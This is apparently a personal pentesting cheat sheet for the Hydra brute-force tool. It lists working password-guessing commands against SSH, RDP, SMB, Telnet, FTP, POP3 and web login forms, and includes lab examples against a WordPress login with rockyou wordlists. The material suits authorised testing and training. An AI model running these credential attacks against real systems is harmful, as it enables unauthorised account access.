---
title: hydra 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - brute forcing
  - windows
  - passwords
---
# Hydra

Hydra can attack nearly 50 services including: Cisco auth, FTP, HTTP, IMAP, RDP, SMB, SSH, Telnet... It uses modules for each protocol


## Basic commands

```bash
# Main syntax:
hydra -L users.txt -P pass.txt <service://server> <options>
# Example:
# hydra -L user.list -P password.list ssh://10.129.42.197
# hydra -L user.list -P password.list rdp://10.129.42.197
# hydra -L user.list -P password.list smb://10.129.42.197

# If we use a file with credentials in this format "user:password" we might use the flag -C
hydra -C <user_pass.list> <protocol>://<IP>
# Example: 
# hydra -C user_pass.list ssh://10.129.42.197

# Get information about a module
hydra -U rdp 

# Attack a telnet service
hydra -L users.txt -P pass.txt telnet://target.server  

# Attack a ssh service
hydra -L user.list -P password.list ssh://$ip

# Attack 3389 RDP
hydra -L user.list -P password.list rdp://$ip

# Attack samba
hydra -L user.list -P password.list smb://$ip

# Attack a web resource
hydra -L users-txt -P pass.txt http-get://localhost/   
# -l: specify login name
# -L: specify a list with login names
# -p: specify a single passwords
# -P: specify a file with passwords
# -C: specify a file with user:password
# -t: how many parallel connections to run when cracking
# -V: verbose
# -f: it stops the attack after finding a password
# -M: list of servers to attack, one entry per line, ‘:’ to specify port

# To see sintax of the http-get and http-post-form modules:
hydra -U http-post-form   
# This will return:
# 	 <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
# 	 Example: “/login.php:userin=^USER^&passin=^PASS^:incorrect”
#	 it perform the attack in the login.php page. It uses the input label name userin (or any other, we need to retrieve this from the html code of the form) to insert the dictionary for users. It uses the input label name passin  (or any other, we need to retrieve this from the html code of the form) to insert the dictionary for passwords. It uses the word incorrect to check out the result of the login process (we need to observe the web behaviour to pick a word). For example:
hydra -l pentester -P /usr/share/wordlists/metasploit/password.lst zev0nlxhh78mfshrhzvq9h8vm.eu-central-4.attackdefensecloudlabs.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:S=Success"


# Example for ftp in a non default port
hydra -L users.txt -P pass.txt ftp://$ip:2121

# Attacking a pop3 service
hydra -L users.txt -p 'Company01!' -f $ip pop3



```


## Real-life examples

```bash
hydra crack.me http-post-form “/login.php:usr=^USER^&pwd=^PASS^:invalid credential” -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f

hydra 192.168.1.45 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V

hydra -l student -P /usr/share/wordlists/rockyou.txt  ssh://192.153.213.3
```

